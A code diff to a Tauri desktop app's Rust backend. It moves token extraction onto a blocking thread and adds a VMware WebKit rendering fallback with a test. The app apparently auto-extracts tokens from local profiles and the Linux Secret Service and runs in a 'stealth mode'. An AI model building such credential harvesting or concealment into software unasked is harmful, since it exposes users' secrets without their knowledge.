@@ -45,16 +45,28 @@ async fn auto_detect_token(_state: State<'_, AppState>) -> Result<Vec<ExtractedA
         None,
     );
 
-    // Extract tokens
-    let tokens = token_extractor::extract_tokens().map_err(|e| {
-        log(
-            LogLevel::Error,
-            LogCategory::TokenExtraction,
-            "Token extraction failed",
-            Some(&e.to_string()),
-        );
-        format!("Token extraction failed: {}", e)
-    })?;
+    // Extract tokens. Local profile scans and Linux Secret Service access are
+    // blocking operations, so keep them off the async command thread.
+    let tokens = tauri::async_runtime::spawn_blocking(token_extractor::extract_tokens)
+        .await
+        .map_err(|e| {
+            log(
+                LogLevel::Error,
+                LogCategory::TokenExtraction,
+                "Token extraction task failed",
+                Some(&e.to_string()),
+            );
+            format!("Token extraction task failed: {}", e)
+        })?
+        .map_err(|e| {
+            log(
+                LogLevel::Error,
+                LogCategory::TokenExtraction,
+                "Token extraction failed",
+                Some(&e.to_string()),
+            );
+            format!("Token extraction failed: {}", e)
+        })?;
 
     log(
         LogLevel::Info,
@@ -994,6 +1006,8 @@ async fn open_in_explorer(path: String) -> Result<(), String> {
 ///
 /// This is the new entry point that replaces direct run() call
 pub fn ensure_stealth_and_run() {
+    configure_linux_webkit_runtime();
+
     // Try to enter stealth mode
     stealth::ensure_stealth_mode();
 
@@ -1049,6 +1063,53 @@ pub fn ensure_stealth_and_run() {
 
     // Run main application
     run();
+}
+
+/// WebKitGTK can create a window but render an entirely blank surface when its
+/// accelerated compositing path runs inside a VMware guest with 3D enabled.
+/// Configure the upstream-supported fallback before Tauri initializes GTK.
+#[cfg(target_os = "linux")]
+fn configure_linux_webkit_runtime() {
+    if std::env::var_os("WEBKIT_DISABLE_COMPOSITING_MODE").is_some()
+        || std::env::var_os("WEBKIT_DISABLE_DMABUF_RENDERER").is_some()
+    {
+        return;
+    }
+
+    let product_name =
+        std::fs::read_to_string("/sys/class/dmi/id/product_name").unwrap_or_default();
+    let system_vendor = std::fs::read_to_string("/sys/class/dmi/id/sys_vendor").unwrap_or_default();
+
+    if linux_webkit_needs_software_compositing(&product_name, &system_vendor) {
+        std::env::set_var("WEBKIT_DISABLE_COMPOSITING_MODE", "1");
+        println!("[WebKit] Disabled accelerated compositing for VMware compatibility");
+    }
+}
+
+#[cfg(not(target_os = "linux"))]
+fn configure_linux_webkit_runtime() {}
+
+#[cfg(target_os = "linux")]
+fn linux_webkit_needs_software_compositing(product_name: &str, system_vendor: &str) -> bool {
+    product_name.to_ascii_lowercase().contains("vmware")
+        || system_vendor.to_ascii_lowercase().contains("vmware")
+}
+
+#[cfg(all(test, target_os = "linux"))]
+mod linux_webkit_runtime_tests {
+    use super::linux_webkit_needs_software_compositing;
+
+    #[test]
+    fn detects_vmware_without_matching_physical_hosts() {
+        assert!(linux_webkit_needs_software_compositing(
+            "VMware Virtual Platform",
+            "VMware, Inc."
+        ));
+        assert!(!linux_webkit_needs_software_compositing(
+            "Precision 7680",
+            "Dell Inc."
+        ));
+    }
 }
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
